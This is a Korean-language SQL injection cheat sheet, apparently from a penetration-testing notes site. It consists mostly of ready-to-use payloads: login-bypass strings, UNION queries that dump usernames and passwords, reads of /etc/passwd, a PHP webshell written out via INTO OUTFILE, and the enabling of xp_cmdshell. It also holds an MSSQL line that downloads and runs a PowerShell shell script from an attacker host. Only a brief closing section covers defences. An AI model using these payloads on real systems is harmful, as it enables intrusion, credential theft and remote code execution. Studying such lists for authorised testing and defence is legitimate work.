---
sidebar_position: 7
---

# SQL Injection

SQL Injection 공격 기법 종합 가이드입니다.

## 기본 개념

SQL Injection은 사용자 입력을 적절히 검증하지 않아 악의적인 SQL 쿼리가 실행되는 취약점입니다.

## 탐지

### 기본 테스트 문자

```sql
'
"
`
')
")
`)
'))
"))
`))
';#---         # 모든 곳에 시도!
```

### Error-Based 탐지

```sql
'
"
' OR '1'='1
" OR "1"="1
' AND '1'='2
```

## 인증 우회

### 마스터 리스트

```sql
';#---
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1--
" or 1=1/*
" or 1=1#
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
```

### 추가 페이로드

```sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
' || '1'='1';-- -
"-"
" "
"&"
"^"
"*"
'--'
"--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
```

## MySQL/MariaDB Injection

### 컬럼 수 찾기

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-1 order by 3;#
```

### 버전 확인

```sql
-1 UNION SELECT 1,2,version();#
' UNION SELECT null,version(),null--
```

### 데이터베이스 이름

```sql
-1 UNION SELECT 1,2,database();#
' UNION SELECT null,database(),null--
```

### 테이블 이름

```sql
-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();#
' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()--
```

### 컬럼 이름

```sql
-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='<TABLE>';#
' UNION SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_name='users'--
```

### 데이터 덤프

```sql
-1 UNION SELECT 1,2,group_concat(<COLUMN>) FROM <DATABASE>.<TABLE>;#
' UNION SELECT null,group_concat(username,':',password),null FROM users--
```

### 파일 읽기

```sql
' UNION SELECT null,LOAD_FILE('/etc/passwd'),null--
SELECT LOAD_FILE('/etc/passwd')
```

### 웹셸 작성

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/shell.php"--
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/shell.php";
```

## MSSQL Injection

### 인증 우회

```sql
' or 1=1--
admin' or 1=1--
```

### Time-Based

```sql
' SELECT @@version; WAITFOR DELAY '00:00:10'; --
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### xp_cmdshell 활성화

```sql
' UNION SELECT 1,null; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

### RCE

```sql
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')" ;--
'; EXEC xp_cmdshell 'whoami'--
```

## Oracle SQL Injection

### 인증 우회

```sql
' or 1=1--
admin' or '1'='1'--
```

### 컬럼 수 찾기

```sql
' ORDER BY 3--
```

### 테이블 이름

```sql
' UNION SELECT null,table_name,null FROM all_tables--
```

### 컬럼 이름

```sql
' UNION SELECT null,column_name,null FROM all_tab_columns WHERE table_name='<TABLE>'--
```

### 데이터 덤프

```sql
' UNION SELECT null,PASSWORD||USER_ID||USER_NAME,null FROM WEB_USERS--
```

## SQLite Injection

### 테이블 이름 추출

```sql
' UNION SELECT 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

### 데이터 추출

```sql
' UNION SELECT 1,2,3,group_concat(password),5 FROM users--
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

## PostgreSQL Injection

### 버전 확인

```sql
' UNION SELECT null,version(),null--
```

### 테이블 이름

```sql
' UNION SELECT null,string_agg(tablename,','),null FROM pg_tables WHERE schemaname='public'--
```

### 파일 읽기

```sql
'; SELECT pg_read_file('/etc/passwd',0,1000000)--
' UNION SELECT null,pg_read_file('/etc/passwd',0,1000000),null--
```

## Error-Based SQL Injection

### MySQL

```sql
' AND extractvalue(0x0a,concat(0x0a,database()))--
' AND extractvalue(0x0a,concat(0x0a,(SELECT user())))--
' OR 1=1 IN (SELECT @@version)--
' OR 1=1 IN (SELECT * FROM users)--
' OR 1=1 IN (SELECT password FROM users)--
' OR 1=1 IN (SELECT password FROM users WHERE username = 'admin')--
```

### MSSQL

```sql
' AND 1=CONVERT(INT,(SELECT @@version))--
```

## UNION-Based SQL Injection

### 수동 공격 단계

```sql
# 1. 컬럼 수 찾기
' ORDER BY 1--
' ORDER BY 2--
...

# 2. UNION으로 데이터베이스 정보 확인
' UNION SELECT null,database(),user(),@@version,null--

# 3. 테이블 및 컬럼 열거
' UNION SELECT null,table_name,column_name,table_schema,null FROM information_schema.columns WHERE table_schema=database()--

# 4. 데이터 덤프
' UNION SELECT null,username,password,description,null FROM users--
```

## Blind SQL Injection

### Boolean-Based

```sql
' AND 1=1--        # True
' AND 1=2--        # False
' AND substring(database(),1,1)='a'--
' AND substring((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

### Time-Based

#### MySQL

```sql
' AND SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

#### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

#### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM pg_sleep(5))--
```

## Second-Order SQL Injection

악의적인 입력을 데이터베이스에 저장한 후, 나중에 다른 쿼리에서 사용될 때 발생:

```sql
# 1. 등록 시 (저장됨)
username: admin'--

# 2. 나중에 비밀번호 변경 쿼리에서:
UPDATE users SET password='newpass' WHERE username='admin'--'
```

## NoSQL Injection (참고)

### MongoDB

```javascript
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
admin' || ''=='
```

## 방어 기법

### Prepared Statements

```php
// PHP PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
```

### Input Validation

- 화이트리스트 검증
- 특수문자 이스케이프
- 타입 체크

### 최소 권한 원칙

- DB 사용자에게 필요한 최소 권한만 부여
- 읽기 전용 계정 사용

## 도구

- **sqlmap**: 자동화된 SQL Injection 도구
- **Burp Suite**: Manual testing
- **Havij**: GUI 기반 도구

## 참고

- 모든 사용자 입력은 잠재적으로 악의적
- Prepared Statements가 가장 안전
- `--`, `#`, `/**/`는 주석 처리
- 에러 메시지를 통한 정보 수집 가능
- Blind Injection은 시간이 오래 걸림
- Second-Order Injection은 탐지가 어려움
